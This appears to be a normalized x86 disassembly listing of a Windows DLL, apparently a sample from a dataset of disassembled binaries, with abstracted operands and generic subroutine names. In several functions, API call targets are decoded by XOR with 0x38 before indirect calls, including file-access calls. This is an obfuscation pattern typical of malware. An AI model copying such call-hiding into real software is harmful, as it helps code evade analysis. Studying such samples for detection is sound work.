push edi
push r--data
push eax
call edx
mov [ esi ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ esi ] 0x0
jl r-xdata
call [ CoUninitialize@IAT ]
mov eax [ esi ]
pop edi
retn
mov eax [ edi ]
mov ecx [ eax ]
mov edx [ ecx + 0x18 ]
push 0x1
push 0x0
push eax
call edx
mov edi [ edi ]
mov [ esi ] eax
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
sub_1000878a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10020a90
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10020a90
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10020a90
push [ esi + 0xc0 ]
call sub_10020a90
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10058824
push [ esi + 0xd4 ]
call sub_10020a90
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_10020a90
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10020a90
pop ecx
push [ esi + 0xb0 ]
call sub_10020a90
push [ esi + 0xbc ]
call sub_10020a90
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10020a90
push [ esi + 0xbc ]
call sub_10009ef2
pop ecx
pop ecx
push eax
call sub_10020a90
pop ecx
push eax
call sub_10020a90
push [ esi + 0xbc ]
call sub_100187b7
pop ecx
pop ecx
sub_100088e0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
movzx esi ax
mov eax esi
shl esi 0x10
push edi
or eax esi
shr ecx 0x1
mov edi edx
[ edi ]
adc ecx ecx
[ edi ]
pop edi
mov eax edx
pop esi
pop ebp
retn
sub_10008920
push ebp
mov ebp esp
push 0xffffffff
push sub_10081f86
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
call sub_100642c0
lea ebx [ esi + 0x70 ]
mov eax 0x7
xor ecx ecx
xor edx edx
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x10 ] ecx
mov [ ebx ] dx
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x90 ] ecx
mov [ esi + 0xa8 ] eax
xor eax eax
mov [ esi + 0xa4 ] ecx
mov [ esi + 0x94 ] ax
mov [ ebp - 0x4 ] 0x1
mov edx edi
mov [ esi + 0xb0 ] ecx
mov eax [ edx + 0x30 ]
cmp eax ecx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x34 ]
mov [ esi + 0xb0 ] eax
push r--data
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
mov [ ebp + 0xc ] ecx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push 0x60000000
push ebx
call [ ebp + 0xc ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx ]
mov eax edi
mov edx [ eax + 0x30 ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp + 0xc ] ecx
lea ebx [ ebx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push 0x0
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
mov ebx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ rw-data ]
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp + 0xc ] edx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push ecx
push edi
call [ ebp + 0xc ]
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push edi
call [ ebp + 0xc ]
xor eax eax
cmp [ ebp - 0x10 ] ebx
sete al
mov [ esi + 0x8 ] eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0xc ]
lea ecx [ esi + 0x94 ]
sar eax 0x1
push eax
push edx
call sub_1005e3c0
jmp r-xdata
mov ecx esi
call sub_10065520
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
sub_10008ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f85b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea edi [ ecx + 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ecx + edi - 0x60 ] r--data
lea ecx [ edi - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10041f10
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi - 0x60 ]
mov eax [ edx + 0x4 ]
mov [ eax + edi - 0x60 ] r--data
mov ecx [ edi - 0x50 ]
mov edx [ ecx + 0x4 ]
mov [ edx + edi - 0x50 ] r--data
mov eax [ edi - 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + edi - 0x60 ] r--data
push edi
mov [ edi ] r--data
call sub_1005927e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10008b51
push 0x8
mov eax sub_1007efb1
call sub_10050d0f
xor ebx ebx
push ebx
push ebx
mov [ ebp - 0x10 ] ebx
call sub_1001b7e6
mov edi [ ebp + 0x14 ]
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_10019368
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_10014f01
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x8
call sub_1005ac7e
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10044c11
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_1005bb7a
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_10067871
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10008fcf
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
call sub_1001a1b3
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10007b0e
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x1c
call sub_1005ac7e
pop ecx
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x12
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_1001a8af
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_1003d9e8
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x14
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
mov ecx eax
call sub_100305a3
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10007739
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0xd
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_1001c782
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0xe
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_1001a8af
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
sub_10008f20
push ebp
mov ebp esp
push 0xffffffff
push sub_10081342
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ ebx + 0x4 ]
cmp edi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax edi
ja r-xdata
mov esi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
mov ecx ebx
call sub_1004c5f0
sub edi eax
mov eax 0x88888889
imul edi
add edx edi
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x3c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_100033e0
mov ecx [ ebx ]
mov eax esi
shl eax 0x4
sub eax esi
mov esi [ ebx + 0x4 ]
lea edi [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx ebx
call sub_1004c5f0
test esi esi
je r-xdata
sub_10008fcf
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10060c46
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1000906c
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_100090c1
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_10009180
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1004c3b6
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1004c3b6
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1007b3cb
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_1007b382
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1004c3b6
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1004c3b6
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_1007b3b2
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1007b3cb
mov eax [ ebp + 0xc ]
push r--data
call sub_100117a0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1004c3b6
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_1007b399
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1004c3b6
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_10009310
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov eax [ ecx + 0x10 ]
push edi
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi eax
cmp esi edi
ja r-xdata
mov eax 0x1
sub eax esi
add edi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
movzx edx [ ebx ]
mov edi edi
mov [ ebp - 0x4 ] eax
mov ecx edi
test edi edi
je r-xdata
test eax eax
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx ebx
mov ecx eax
test esi esi
je r-xdata
cmp [ eax ] dx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov bx [ ecx ]
cmp bx [ edx ]
jne r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sbb edx edx
and edx 0xfffffffe
inc edx
je r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
mov ecx eax
sub ecx [ ebp - 0x4 ]
or edx 0xffffffff
sar ecx 0x1
sub edx ecx
add edi edx
add eax 0x2
jmp r-xdata
sub_100093d0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0xb0
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1001c310
mov eax esi
mov esp ebp
pop ebp
retn
sub_10009450
push ebp
mov ebp esp
mov eax [ ecx + 0x30 ]
push esi
mov esi [ eax ]
push edi
mov edi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ edi ] esi
call sub_100067d1
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp + 0x8 ]
call sub_1002470e
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_10009485
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100254fa
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_100094b0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov al 0x38
xor [ ebp - 0x14 ] al
xor [ ebp - 0x13 ] al
xor [ ebp - 0x12 ] al
xor [ ebp - 0x11 ] al
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] 0x6
call [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10009500
push ebp
mov ebp esp
push ecx
push 0x0
push eax
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x0
call sub_10055aa0
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
push eax
mov ecx edi
call sub_10051390
mov eax edi
mov esp ebp
pop ebp
retn
sub_10009540
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10054b6f
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1004b520
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_1004a7e0
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x20
sub_10009600
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
sub esp 0x8
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov edi ecx
jne r-xdata
cmp edi [ esi + 0x4 ]
je r-xdata
mov ecx [ edx ]
lea ecx [ ecx ]
mov ecx [ edx ]
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10011860
push eax
push edi
lea eax [ ebp + 0x8 ]
push eax
mov ecx esi
call sub_1005e0c0
mov eax [ ebp + 0x8 ]
pop edi
add eax 0x10
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ edx ]
cmp eax [ edi + 0xc ]
jae r-xdata
mov edi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1000967a
call sub_100161e5
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1000e601
pop ecx
push 0x3
call sub_1005d371
int3
push 0x1
push 0x40000015
push 0x3
call sub_1000defd
add esp 0xc
sub_100096ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_1007b220
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000794b
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000794b
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_1000978f
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
